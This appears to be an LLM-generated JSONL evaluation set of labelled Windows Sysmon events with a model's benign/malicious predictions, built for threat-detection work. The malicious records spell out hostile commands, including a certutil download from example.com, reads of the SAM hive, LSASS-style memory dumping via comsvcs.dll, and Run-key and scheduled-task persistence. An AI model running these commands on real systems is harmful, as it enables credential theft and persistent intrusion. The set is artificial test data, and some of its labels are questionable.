{"EventID": 1, "EventTime": "2020-05-01 22:55:54", "UtcTime": "2020-05-01T22:55:54.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c tasklist /v", "ProcessId": "13456", "ProcessGUID": "{6bbf237a-3490-5eac-3490-000000003490}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "4328", "ParentProcessGUID": "{6bbf237a-10e8-5eac-10e8-0000000010e8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "process_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:54] | PID=13456 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c tasklist /v", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing tasklist command from explorer.exe to view running processes - standard system administration activity with no suspicious indicators.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:04:40", "UtcTime": "2025-10-10T08:04:40.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Git\\bin\\bash.exe", "CommandLine": "C:\\Program Files\\Git\\bin\\bash.exe", "ProcessId": "14567", "ProcessGUID": "{9ace3402-30f4-5ec2-1000-000000001900}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4512", "ParentProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentCommandLine": "cmd.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:40] | PID=14567 | User=CORP\\jsmith | Image=C:\\Program Files\\Git\\bin\\bash.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=C:\\Program Files\\Git\\bin\\bash.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Git bash being launched from cmd.exe is normal developer activity. This is a standard workflow for developers using Git version control on Windows systems.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -split -f http://example.com/upload/data.txt C:\\Users\\Public\\Documents\\data.txt", "ProcessId": "1658", "ProcessGUID": "{6bbf237a-067a-5eac-067a-00000000067a}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1524", "ParentProcessGUID": "{6bbf237a-05f4-5eac-05f4-0000000005f4}", "ParentCommandLine": "cmd.exe /c certutil -encode C:\\Users\\Public\\Documents\\important.pdf C:\\Users\\Public\\Documents\\encoded.txt", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=1658 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\certutil.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=certutil -urlcache -split -f http://example.com/upload/data.txt C:\\Users\\Public\\Documents\\data.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Certutil being used to download a file from a remote URL to a public directory - a common Living Off The Land technique for downloading malicious payloads while evading detection.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2025-11-03 16:24:30", "UtcTime": "2025-11-03T16:24:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\msedge.exe", "CommandLine": "\"C:\\Windows\\System32\\msedge.exe\" --profile-directory=Default --app-id=ojkdgjmjkeckkefkeoipbmjldmapjald", "ProcessId": "7890", "ProcessGUID": "{7894abcd-4ef0-7839-0a1c-a8227a7d0666}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith", "LogonId": "0x12345", "_label": "benign", "_source": "llm", "prompt": "[2025-11-03 16:24:30] | PID=7890 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\msedge.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Windows\\System32\\msedge.exe\" --profile-directory=Default --app-id=ojkdgjmjkeckkefkeoipbmjldmapjald", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Edge browser launched by Windows Explorer with standard profile parameters - normal user browsing activity with legitimate parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 11, "EventTime": "2025-10-10 08:01:30", "UtcTime": "2025-10-10T08:01:30.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2005", "ProcessGUID": "{12345678-1234-5678-1234-567812340006}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\user\\document.docx", "CreationUtcTime": "2025-10-10T08:01:30.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:30] | PID=2005 | User=WORKSTATION\\user | Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Word (WINWORD.EXE) running from legitimate Office installation directory by a standard user - normal office application usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:25", "UtcTime": "2020-05-01T22:56:25.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SysUpdate /t REG_SZ /d \"C:\\Users\\pbeesly\\AppData\\Local\\Temp\\svchost.exe\"", "ProcessId": "1256", "ProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1245", "ParentProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentCommandLine": "cmd.exe /c start schtasks /create /tn \"System Maintenance\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc onlogon /ru System", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:25] | PID=1256 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\reg.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SysUpdate /t REG_SZ /d \"C:\\Users\\pbeesly\\AppData\\Local\\Temp\\svchost.exe\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Registry modification adding suspicious executable (svchost.exe) from Temp directory to autorun location for persistence. Legitimate svchost.exe resides in System32, not user Temp folders.", "confidence": "high", "attack_technique": "persistence"}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:41", "UtcTime": "2020-05-01T22:55:41.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmdkey /list", "ProcessId": "1234", "ProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "456", "ParentProcessGUID": "{6bbf237a-01c8-5eac-01c8-0000000001c8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:41] | PID=1234 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmdkey /list", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "The cmdkey /list command is used to enumerate stored Windows credentials, which is a common credential discovery technique used by attackers to find credentials for lateral movement or privilege escalation.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2025-10-10 08:01:00", "UtcTime": "2025-10-10T08:01:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Git\\bin\\bash.exe", "CommandLine": "C:\\Program Files\\Git\\bin\\bash.exe", "ProcessId": "9012", "ProcessGUID": "{c14579d0-5f61-a400-1600-000000000a00}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4512", "ParentProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentCommandLine": "cmd.exe /c dir C:\\Users", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:00] | PID=9012 | User=CORP\\jsmith | Image=C:\\Program Files\\Git\\bin\\bash.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=C:\\Program Files\\Git\\bin\\bash.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Git bash launched from cmd.exe is a normal development workflow. User jsmith is likely a developer using Git tools for version control operations.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:40", "UtcTime": "2025-10-10T08:00:40.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt", "ProcessId": "8901", "ProcessGUID": "{b03468cf-4e50-93ff-1500-000000000900}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:40] | PID=8901 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\notepad.exe | Parent=C:\\Windows\\explorer.exe | CMD=notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User opening a text file in their Documents folder with notepad launched from Windows Explorer - standard legitimate desktop activity with normal parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:50", "UtcTime": "2020-05-01T22:57:50.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\findstr.exe", "CommandLine": "findstr /spin \"password\" C:\\Program Files\\Common Files\\*.dll", "ProcessId": "1289", "ProcessGUID": "{6bbf237a-0509-5eac-0509-000000000509}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1278", "ParentProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentCommandLine": "cmd.exe /c dir /s /b C:\\Users\\Public\\*password*.txt", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:50] | PID=1289 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\findstr.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=findstr /spin \"password\" C:\\Program Files\\Common Files\\*.dll", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Findstr searching for \"password\" strings in DLL files under Program Files - clear credential discovery attempt to find hardcoded passwords in application files.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 3, "EventTime": "2025-10-10 08:01:00", "UtcTime": "2025-10-10T08:01:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Chrome\\chrome.exe", "ProcessId": "1234", "ProcessGUID": "{bc11682e-0103-5eb2-1000-000000000900}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "54322", "DestinationIp": "142.250.185.174", "DestinationPort": "443", "DestinationHostname": "www.google.com", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:00] | PID=1234 | User=CORP\\jsmith | Image=C:\\Program Files\\Chrome\\chrome.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Chrome browser execution by a domain user - standard legitimate web browsing activity with no suspicious command-line arguments or behaviors.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-09 15:36:00", "UtcTime": "2025-10-09T15:36:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c dir C:\\Users", "ProcessId": "4512", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb237a-cafb-5eac-1000-000000000401}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:00] | PID=4512 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c dir C:\\Users", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing a simple directory listing command via cmd.exe spawned from explorer.exe - standard user activity with no suspicious indicators.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:10", "UtcTime": "2020-05-01T22:56:10.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c certutil -encode C:\\Users\\Public\\Documents\\important.pdf C:\\Users\\Public\\Documents\\encoded.txt", "ProcessId": "1524", "ProcessGUID": "{6bbf237a-05f4-5eac-05f4-0000000005f4}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "432", "ParentProcessGUID": "{6bbf237a-01b0-5eac-01b0-0000000001b0}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:10] | PID=1524 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c certutil -encode C:\\Users\\Public\\Documents\\important.pdf C:\\Users\\Public\\Documents\\encoded.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Certutil being used to encode a PDF file, which is a common LOTL technique for data obfuscation before exfiltration. Additionally, the NETWORK SERVICE account spawning cmd.exe from explorer.exe is highly suspicious.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "dir /s /b *password*.txt", "ProcessId": "1237", "ProcessGUID": "{6bbf237a-04d5-5eac-04d5-0000000004d5}", "ParentImage": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "ParentProcessId": "1212", "ParentProcessGUID": "{6bbf237a-04bc-5eac-04bc-0000000004bc}", "ParentCommandLine": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=1237 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr | CMD=dir /s /b *password*.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Command searches entire filesystem for password-containing text files, spawned from suspicious ProgramData location with Unicode right-to-left override character in filename (cod.3aka3.scr) - indicates credential discovery after malware execution.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:58:10", "UtcTime": "2020-05-01T22:58:10.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c type C:\\Windows\\System32\\config\\SAM", "ProcessId": "1300", "ProcessGUID": "{6bbf237a-0514-5eac-0514-000000000514}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:58:10] | PID=1300 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c type C:\\Windows\\System32\\config\\SAM", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Attempting to read the SAM file which contains password hashes - clear credential discovery attempt. The NETWORK SERVICE account accessing SAM via cmd.exe spawned from explorer.exe is highly suspicious.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\attrib.exe", "CommandLine": "attrib +h +s C:\\Users\\Public\\Documents\\suspicious.dll", "ProcessId": "1256", "ProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "456", "ParentProcessGUID": "{6bbf237a-01c8-5eac-01c8-0000000001c8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "permission_manipulation", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=1256 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\attrib.exe | Parent=C:\\Windows\\explorer.exe | CMD=attrib +h +s C:\\Users\\Public\\Documents\\suspicious.dll", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using attrib.exe to set hidden (+h) and system (+s) attributes on a DLL file in a public location, indicating an attempt to hide malicious files from normal view. The NETWORK SERVICE account and explorer.exe parent process relationship is also suspicious.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:50", "UtcTime": "2025-10-10T08:03:50.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "ProcessId": "123", "ProcessGUID": "{3466d1b6-2a9c-5ebb-1000-000000001200}", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentProcessId": "456", "ParentProcessGUID": "{78aabbc7-3bec-5ebf-1000-000000001600}", "ParentCommandLine": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "System", "CurrentDirectory": "C:\\Windows\\system32\\", "LogonId": "0x3e4", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:50] | PID=123 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\svchost.exe | Parent=C:\\Windows\\System32\\services.exe | CMD=C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Legitimate svchost.exe process running as SYSTEM with standard netsvcs parameter, spawned by services.exe which is the expected parent process for Windows service hosting.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:38", "UtcTime": "2020-05-01T22:57:38.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c sc \\\\DESKTOP-TARGET create EvilService binpath= \"C:\\Windows\\System32\\cmd.exe /c calc.exe\" type= own start= auto", "ProcessId": "6216", "ProcessGUID": "{6bbf237a-1848-5eac-1848-000000001848}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1564", "ParentProcessGUID": "{6bbf237a-061c-5eac-061c-00000000061c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:38] | PID=6216 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c sc \\\\DESKTOP-TARGET create EvilService binpath= \"C:\\Windows\\System32\\cmd.exe /c calc.exe\" type= own start= auto", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Creating a service on a remote system (DESKTOP-TARGET) with a suspicious command execution payload (calc.exe via cmd.exe) - classic lateral movement and persistence technique.", "confidence": "high", "attack_technique": "lateral_movement"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:14", "UtcTime": "2020-05-01T22:56:14.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c start rundll32.exe comsvcs.dll,MiniDump 1337 c:\\temp\\la.dmp full", "ProcessId": "1024", "ProcessGUID": "{6bbf237a-0400-5eac-0400-000000000400}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "420", "ParentProcessGUID": "{6bbf237a-01a4-5eac-01a4-0000000001a4}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "memory_credential_dumping", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:14] | PID=1024 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c start rundll32.exe comsvcs.dll,MiniDump 1337 c:\\temp\\la.dmp full", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Rundll32.exe invoking comsvcs.dll MiniDump to dump process memory (PID 1337) to disk - classic credential dumping technique used to extract LSASS passwords from memory.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:05", "UtcTime": "2020-05-01T22:56:05.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c schtasks /create /tn \"System Maintenance\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc onlogon /ru System", "ProcessId": "2192", "ProcessGUID": "{6bbf237a-0890-5eac-0890-000000000890}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1564", "ParentProcessGUID": "{6bbf237a-061c-5eac-061c-00000000061c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:05] | PID=2192 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c schtasks /create /tn \"System Maintenance\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc onlogon /ru System", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Creating a scheduled task named \"System Maintenance\" that runs an executable from the Temp directory with SYSTEM privileges on logon - classic persistence mechanism using a suspicious location and masquerading as legitimate maintenance.", "confidence": "high", "attack_technique": "persistence"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:10", "UtcTime": "2020-05-01T22:56:10.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c start schtasks /create /tn \"System Maintenance\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc onlogon /ru System", "ProcessId": "1245", "ProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:10] | PID=1245 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c start schtasks /create /tn \"System Maintenance\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc onlogon /ru System", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Scheduled task creation for persistence with suspicious executable in Temp directory running as SYSTEM at logon - classic persistence mechanism with privilege escalation.", "confidence": "high", "attack_technique": "persistence"}}
